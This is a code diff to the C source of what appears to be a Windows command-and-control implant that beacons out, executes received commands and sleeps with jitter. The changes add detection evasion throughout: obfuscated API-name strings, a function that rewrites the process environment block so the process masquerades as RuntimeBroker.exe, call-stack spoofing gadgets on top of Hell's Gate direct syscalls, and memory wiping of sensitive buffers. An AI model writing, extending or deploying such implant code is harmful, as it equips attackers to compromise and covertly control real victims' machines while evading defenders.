@@ -17,6 +17,7 @@
 #include "../include/obfstr.h"
 #include <string.h>
 
+
 /* ── Global agent state ──────────────────────────────────────────────────── */
 AgentState g_agent;
 
@@ -72,7 +73,7 @@ static void PopulateIdentity(void) {
     DWORD hlen = HOSTNAME_MAX;
     typedef BOOL (WINAPI *pfnGetComputerNameExW)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
     pfnGetComputerNameExW pFn = (pfnGetComputerNameExW)(FARPROC)
-        GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExW");
+        GetProcAddress(GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("GetComputerNameExW"));
     if (pFn) pFn(ComputerNameDnsHostname, whost, &hlen);
     WstrToStr(whost, g_agent.hostname, HOSTNAME_MAX);
     if (!g_agent.hostname[0]) xsnprintf(g_agent.hostname, HOSTNAME_MAX, "unknown");
@@ -82,7 +83,7 @@ static void PopulateIdentity(void) {
     DWORD ulen = USERNAME_MAX;
     typedef BOOL (WINAPI *pfnGetUserNameW)(LPWSTR, LPDWORD);
     pfnGetUserNameW pUser = (pfnGetUserNameW)(FARPROC)
-        GetProcAddress(LoadLibraryA("advapi32.dll"), "GetUserNameW");
+        GetProcAddress(LoadLibraryA(OBFSTR("advapi32.dll")), OBFSTR("GetUserNameW"));
     if (pUser) pUser(wuser, &ulen);
     WstrToStr(wuser, g_agent.username, USERNAME_MAX);
     if (!g_agent.username[0]) xsnprintf(g_agent.username, USERNAME_MAX, "unknown");
@@ -102,6 +103,41 @@ static void PopulateIdentity(void) {
     }
 }
 
+/* ── PEB masquerade ──────────────────────────────────────────────────────── */
+/* RTL_USER_PROCESS_PARAMETERS offsets (x64, all Win10/11) */
+#define PEB_OFFSET_PROC_PARAMS  0x20
+#define PP_OFFSET_IMAGE_PATH    0x60   /* UNICODE_STRING ImagePathName */
+#define PP_OFFSET_CMDLINE       0x70   /* UNICODE_STRING CommandLine   */
+
+static void PatchPEB(void) {
+    BYTE *peb = (BYTE*)READ_GS_QWORD(0x60);
+    BYTE *pp  = *(BYTE**)(peb + PEB_OFFSET_PROC_PARAMS);
+    if (!pp) return;
+
+    WCHAR fake_image[MAX_PATH];
+    WCHAR fake_cmd[MAX_PATH];
+    WOBFSTR("C:\\Windows\\System32\\RuntimeBroker.exe", fake_image, MAX_PATH);
+    WOBFSTR("C:\\Windows\\System32\\RuntimeBroker.exe -Embedding", fake_cmd, MAX_PATH);
+
+    WCHAR *strs[2]    = { fake_image, fake_cmd };
+    int    offsets[2] = { PP_OFFSET_IMAGE_PATH, PP_OFFSET_CMDLINE };
+
+    for (int i = 0; i < 2; i++) {
+        WCHAR *src = strs[i];
+        int nch = 0;
+        while (src[nch]) nch++;
+        SIZE_T nbytes = (SIZE_T)(nch + 1) * sizeof(WCHAR);
+        PVOID  buf    = NULL;
+        if (!NT_SUCCESS(NtAlloc((HANDLE)(LONG_PTR)-1, &buf, nbytes, PAGE_READWRITE)))
+            continue;
+        for (int j = 0; j <= nch; j++) ((WCHAR*)buf)[j] = src[j];
+        BYTE *us = pp + offsets[i];
+        *(USHORT*)(us + 0x00) = (USHORT)(nch * sizeof(WCHAR));
+        *(USHORT*)(us + 0x02) = (USHORT)((nch + 1) * sizeof(WCHAR));
+        *(WCHAR**)(us + 0x08) = (WCHAR*)buf;
+    }
+}
+
 /* ── Derive AES key from CFG_ENC_KEY ─────────────────────────────────────── */
 
 static void DeriveKey(void) {
@@ -116,6 +152,7 @@ static void GenerateAgentID(void) {
               g_agent.hostname, g_agent.username,
               CFG_SERVER_URL, CFG_INSTANCE_SALT);
     GenUUID(seed, g_agent.agent_id);
+    SecureZero(seed, sizeof(seed));
 }
 
 /* ── WinMain ─────────────────────────────────────────────────────────────── */
@@ -132,8 +169,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     /* 2. Decode obfuscated string table (must be first after sandbox gate) */
     ObfInit();
 
-    /* 3. Hell's Gate */
+    /* 3. Hell's Gate + call-stack gadgets */
     if (!HellsGateInit()) ExitProcess(1);
+    InitCallstackGadgets(HellsGateNtdllBase());
 
     /* 4. Crypto */
     if (!CryptoInit()) ExitProcess(1);
@@ -144,8 +182,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     /* 5. WinHTTP */
     if (!BeaconInit()) ExitProcess(1);
 
-    /* 6. Identity */
+    /* 6. Identity + PEB masquerade */
     PopulateIdentity();
+    PatchPEB();
     DeriveKey();
     GenerateAgentID();
 
@@ -164,6 +203,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         BYTE rb[1];
         RandBytes(rb, 1);
         LONGLONG delaySec = 30 + (int)(rb[0] % 91);   /* 30–120 s */
+        SecureZero(rb, sizeof(rb));
         NtDelay(delaySec * 10000000LL);
     }
 #endif
@@ -187,6 +227,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         if (ok && cmd.type[0]) {
             lastResult = ExecuteCommand(&cmd);
         }
+        SecureZero(&cmd, sizeof(cmd));
 
         LONGLONG sleepMs = (LONGLONG)JitteredInterval();
         if (g_agent.sleep_mask) {
